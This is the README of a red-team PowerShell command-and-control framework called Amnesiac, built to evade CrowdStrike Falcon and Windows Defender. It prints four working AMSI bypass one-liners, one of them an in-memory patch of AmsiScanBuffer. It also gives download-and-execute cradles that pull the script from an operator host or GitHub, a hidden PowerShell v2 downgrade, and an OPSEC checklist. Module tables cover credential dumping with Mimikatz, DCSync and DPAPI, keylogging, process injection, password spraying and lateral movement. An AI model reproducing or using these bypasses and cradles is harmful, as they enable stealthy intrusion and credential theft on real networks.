# Amnesiac — Red Team Edition

Post-exploitation C2 framework over Windows named pipes. Built for red team engagements with a primary focus on **detection evasion** against CrowdStrike Falcon and Windows Defender.

All tool modules are delivered in-memory over the pipe channel — no GitHub downloads from targets, no disk writes by default.

---

## Quick Navigation

- [Scenario 1 — Non-Domain-Joined Operator](#scenario-1--non-domain-joined-operator)
- [Scenario 2 — Assumed Breach](#scenario-2--assumed-breach)
- [AMSI Bypass Reference](#amsi-bypass-reference)
- [Shell Types](#shell-types)
- [Local Shell](#local-shell)
- [Tool Loading](#tool-loading)
- [Payload Formats](#payload-formats)
- [Key Commands](#key-commands)
- [OPSEC Checklist](#opsec-checklist)

---

## Scenario 1 — Non-Domain-Joined Operator

You have your own machine on the target network (or VPN'd in) with domain credentials but the machine is NOT domain-joined. No EDR on your own machine.

### Setup

```powershell
# Open a domain-credentialed PS session
runas /netonly /user:DOMAIN\username powershell.exe

# In the new window — dot-source and start
. .\Amnesiac.ps1
Amnesiac -NonDomain -HostIP <your-IP>
# Or just: Amnesiac -NonDomain  (auto-detects your IP)
```

### First steps after loading

```
engagement nondomained    # set operational profile
modules                   # confirm tool cache loaded
serve                     # start HTTP server (targets can pull tools + bootstrap script)
bootstrap                 # show AMSI bypass one-liners ready to paste into targets
```

### Generating payloads

```
# From the main menu, select:
[1] Reverse Shell    — target calls back to you (requires inbound port 445)
[2] Bind Shell       — you connect out to target (better when inbound blocked)

# Format picker appears — choose [3] stealth for CrowdStrike environments
```

### Notes

- All domain tools (PowerView, SessionHunter, PassSpray) use your `runas /netonly` token automatically — no extra config
- `diskmode` is OFF by default — targets never write tool files to disk
- For Reverse Shell: ensure port 445 is open inbound on your machine from the target network
- For Bind Shell on non-domain machine: AD enumeration is unavailable — you will be prompted for target IPs manually

---

## Scenario 2 — Assumed Breach

You have a foothold on a **domain-joined machine running CrowdStrike Falcon**. You are running Amnesiac ON the compromised machine to enumerate and move laterally. No separate operator box.

### Critical: AMSI must be bypassed BEFORE loading Amnesiac

AMSI scans the entire script content as it downloads. If you run `iex (DownloadString(...))` without a bypass active in the current PS process, the script is caught before a single line executes.

### Step 1 — Bypass AMSI in the current PS process

Run ONE of these. Try in order — [1] is most evasive:

**[1] Field-enum via char array** (no type or field name literals — most evasive):
```powershell
try{$_at=[Ref].Assembly.GetType([string]::new([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));$_at.GetFields([Reflection.BindingFlags]'NonPublic,Static')|%{if($_.FieldType-eq[bool]){$_.SetValue($null,$true)}elseif($_.FieldType-eq[IntPtr]){$_.SetValue($null,[IntPtr]::Zero)}}}catch{}
```

**[2] amsiSession null** (different target field, char arrays for both type and field name):
```powershell
try{$_t=[Ref].Assembly.GetType([string]::new([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));$_t.GetField([string]::new([char[]](97,109,115,105,83,101,115,115,105,111,110)),'NonPublic,Static').SetValue($null,$null)}catch{}
```

**[3] String-split** (concat breaks static sig matching — simpler, weaker evasion):
```powershell
try{$_t=[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Auto'+'mation.'+'Ams'+'iUt'+'ils');$_t.GetField('amsi'+'Con'+'text','NonPublic,Static').SetValue($null,[IntPtr]::Zero);$_t.GetField('amsi'+'Init'+'Failed','NonPublic,Static').SetValue($null,$true)}catch{}
```

**[4] Direct memory patch** (patches AmsiScanBuffer bytes — no reflection on AMSI internals):
```powershell
$_c=-join((65..90+97..122)|Get-Random -Count 8|%{[char]$_});Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;public class $_c{[DllImport(`"kernel32`")]public static extern bool VP(IntPtr a,uint b,uint c,out uint d);}";$_t=[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils');$_fp=$_t.GetMethod('Sc'+'anContent','NonPublic,Static').MethodHandle.GetFunctionPointer();$_o=[uint32]0;& ([scriptblock]::Create("$_c::VP(`$_fp,[uint32]6,[uint32]0x40,[ref]`$_o)"))|Out-Null;[Runtime.InteropServices.Marshal]::Copy([byte[]](0x48,0x31,0xC0,0xC3),0,$_fp,4)
```

> **If every technique is blocked:** CrowdStrike is using behavioral detection, not just string matching. The bypass pattern itself is flagged regardless of obfuscation. Options: try a PS v2 downgrade (`powershell -version 2` — no AMSI support), deliver the stager as a compiled binary that patches AMSI in native code before PS sees it, or wrap the bypass in a `-enc` base64 one-liner.

### Step 2 — Load Amnesiac

```powershell
# From operator HTTP server (if Scenario 1 operator box is on the network):
iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1');Amnesiac

# From GitHub (pure assumed breach, no operator box):
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
```

### Step 3 — Operate

```
engagement domained       # set operational profile
modules                   # confirm embedded tools loaded (6 always available)
5                         # enter Local Shell — run tools on this machine
```

### Notes

- `diskmode` MUST remain OFF — any disk write may be scanned by CrowdStrike
- Tools not in the embedded tier are fetched from GitHub on demand when you type their keyword (e.g. `PowerView`) — this is an outbound HTTP call from the compromised machine
- `Amnesiac_ShellReady.ps1` is used (not `Amnesiac.ps1`) — no ANSI color codes, works in constrained terminals
- The `bootstrap` command in the main menu regenerates all bypass one-liners with the current server URL

---

## AMSI Bypass Reference

Run `bootstrap` from the Amnesiac main menu at any time to get all four bypass one-liners pre-formatted and ready to copy, along with the correct load command for your configured server.

### Why bypasses get caught

CrowdStrike operates at two levels:

**Static** — matches known strings (`amsiInitFailed`, `AmsiUtils`, `System.Management.Automation`) in script content. Beaten by char arrays and string splitting (techniques [1]–[3]).

**Behavioral** — detects the pattern of reflection into `System.Management.Automation` internals regardless of string obfuscation. Beaten by technique [4] (no AMSI reflection) or by delivering the bypass via a compiled binary.

### PowerShell v2 downgrade

PS v2 predates AMSI entirely. If installed on the target:
```powershell
powershell -version 2 -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1');Amnesiac"
```

Check availability: `Test-Path 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'`

---

## Shell Types

### Local Shell — option [5]

Runs an interactive command loop **in the current PS process**. No pipe, no second window. Primary tool for Scenario 2 — run tools on the machine running Amnesiac.

```
Main Menu → 5

HOSTNAME> PowerView          # loads pwv.ps1 from cache (or fetches from GitHub)
HOSTNAME> Get-Domain         # now available — uses runas/netonly token for LDAP
HOSTNAME> HashGrab            # loads deps + runs Invoke-GrabTheHash automatically
HOSTNAME> PsMapExec GenRelayList -Targets "All" -Domain "domain.local"
HOSTNAME> back               # return to main menu
```

Type `help` inside the local shell to see all available keywords.

### Reverse Shell — option [1]

Target calls back to the operator machine. You listen, target connects.

- Waits indefinitely — press `Q` to cancel cleanly
- On connection: drops directly into the interactive session
- Requires port 445 open inbound on operator machine from target network

### Bind Shell — option [2]

You connect OUT to targets running a server payload.

- Better than Reverse Shell when inbound connections are blocked
- Sessions arrive in real time as targets are discovered
- On non-domain machine: prompted for target IP list (AD enum unavailable)
- Sessions listed as `[6]`, `[7]`, etc. — interact by typing the number

---

## Local Shell

### Scripts Loading

| Keyword | Loads | Notes |
|---------|-------|-------|
| `Patch` | SimpleAMSI | AMSI bypass for current session |
| `PatchNet` | NETAMSI | .NET AMSI bypass |
| `PInject` | PInject | Process injection module |
| `PowerView` | pwv | `Get-Domain`, `Get-DomainUser`, `Find-DomainShare`, etc. |
| `Mimi` | Suntour | `Mimi -Command "sekurlsa::logonpasswords"` |
| `Rubeus` | Ferrari | `Rubeus -Command "triage"` |

### Local Actions

| Keyword | Loads | Auto-runs |
|---------|-------|-----------|
| `Ask4Creds` | Ask4Creds | credential prompt |
| `AutoMimi` | Suntour | `Mimi -Command "sekurlsa::logonpasswords"` |
| `CredMan` | cms | `Enum-Creds` |
| `Dpapi` | Dpapi | use `Invoke-DpapiDump` |
| `HashGrab` | SimpleAMSI + NETAMSI + Invoke-GrabTheHash | `Invoke-GrabTheHash` |
| `Hive` | HiveDump | `Invoke-HiveDump` |
| `Kerb` | dumper | use `Invoke-Kirby` |
| `Keylog` | klg | use `KeyLog "C:\path\log.txt"` |
| `Monitor` | TGT_Monitor | use `TGT_Monitor` |
| `MultiRDP` | TermsrvPatcher | concurrent RDP |
| `PPL` | ppl | use `Invoke-PPLKiller` |

### Domain Actions

| Keyword | Loads | Notes |
|---------|-------|-------|
| `CredValidate` | Validate-Credentials | use `Validate-Credentials` |
| `DCSync` | Sync | use `Invoke-DCSync` |
| `Impersonation` | Token-Impersonation | use `Token-Impersonation` |
| `LocalAdminAccess` | Find-LocalAdminAccess | use `Find-LocalAdminAccess` |
| `PassSpray` | PassSpray | use `Invoke-PassSpray` |
| `PsMapExec` | PsMapExec | `PsMapExec <Method> -Targets <t> [-Domain <d>]` |
| `Remoting` | Invoke-SMBRemoting + Invoke-WMIRemoting | SMB or WMI remote exec |
| `SessionHunter` | Invoke-SessionHunter | hunt active domain sessions |

---

## Tool Loading

| Tier | Source | When available |
|------|--------|---------------|
| **1 Embedded** | gzip+base64 blobs in `Amnesiac.ps1` | Always — 6 tools: SimpleAMSI, NETAMSI, Token-Impersonation, Invoke-SMBRemoting, Invoke-WMIRemoting, Find-LocalAdminAccess |
| **2 Local** | `Tools\` directory scanned at startup | Scenario 1 (Tools\ present). `modules reload` to refresh |
| **3 GitHub** | Fetched on demand via `Fetch-ToolFromGitHub` | Any scenario — operator-side fetch only, target never calls GitHub |

Tools in `$global:ToolSources` (e.g. PsMapExec) are fetched from their own repos when not found locally.

To add a new external tool: add one entry to `$global:ToolSources` in `Initialize-ToolCache` and a keyword in `$_kw` in `Start-LocalShell`.

---

## Payload Formats

| # | Format | Use when |
|---|--------|---------|
| `[1] b64` | PowerShell `-EncodedCommand` | maximum compatibility |
| `[2] gzip` | gzip+base64 | reducing size |
| `[3] stealth` | obfuscated + AMSI/ETW/SBL bypasses inline | CrowdStrike environments |
| `[4] raw` | plain PowerShell | debugging, constrained shells |
| `[5] pwsh` | `Start-Process` hidden window | process tree evasion |

---

## Key Commands

### Main Menu

| Command | Description |
|---------|-------------|
| `bootstrap` | AMSI bypass one-liners + load command for assumed breach |
| `engagement nondomained` | Scenario 1 profile — checks runas/netonly token |
| `engagement domained` | Scenario 2 profile — assumed breach |
| `diskmode [on\|off]` | Toggle disk writes (OFF by default) |
| `modules` | List cached tools |
| `modules reload` | Refresh cache from `Tools\` |
| `serve` | HTTP server for `Tools\` + `Amnesiac_ShellReady.ps1` |
| `psk <passphrase>` | AES-128 encryption on pipe channel |
| `key hostname <value>` | Bind payload to specific target hostname |
| `launcher` | Cycle execution vector: ps / wmi / schtask / com |
| `artifacts` | List in-memory captured data |
| `save <type>` | Write artifact to disk (requires `diskmode on`) |

### Remote Session

| Command | Description |
|---------|-------------|
| `PowerView` / `Mimi` / `PsMapExec` etc. | Load tool modules (same as local shell keywords) |
| `load loader` | Deliver AmnesiacLoader C# assembly to target |
| `Migrate ps <pid>` | Inject payload into running process |
| `GetSystem` | Elevate to SYSTEM (new session) |
| `Download <filename>` | Pull file from target |
| `Upload <path>` | Push file to target |
| `ScreenShot` | 1080p screenshot |
| `Keylog` | Start keylogger |
| `Kill` | Terminate session |
| `Exit` | Background session |

---

## OPSEC Checklist

```
[ ] runas /netonly session active (Scenario 1) — check: engagement nondomained
[ ] engagement profile set
[ ] diskmode OFF — check: diskmode
[ ] tool cache loaded — check: modules
[ ] serve running if Scenario 2 targets need to pull Amnesiac_ShellReady.ps1
[ ] psk set: psk <passphrase>
[ ] launcher set for target environment: launcher
[ ] key hostname set if targeting specific machine
[ ] Reverse Shell: port 445 open inbound on operator machine
[ ] Bind Shell (non-domain): target IP list ready
```

---

## Architecture

See `docs/ARCHITECTURE.md` for the full technical reference: pipe protocol, tool delivery tiers, payload internals, AmnesiacLoader modules, session flow, and development rules.
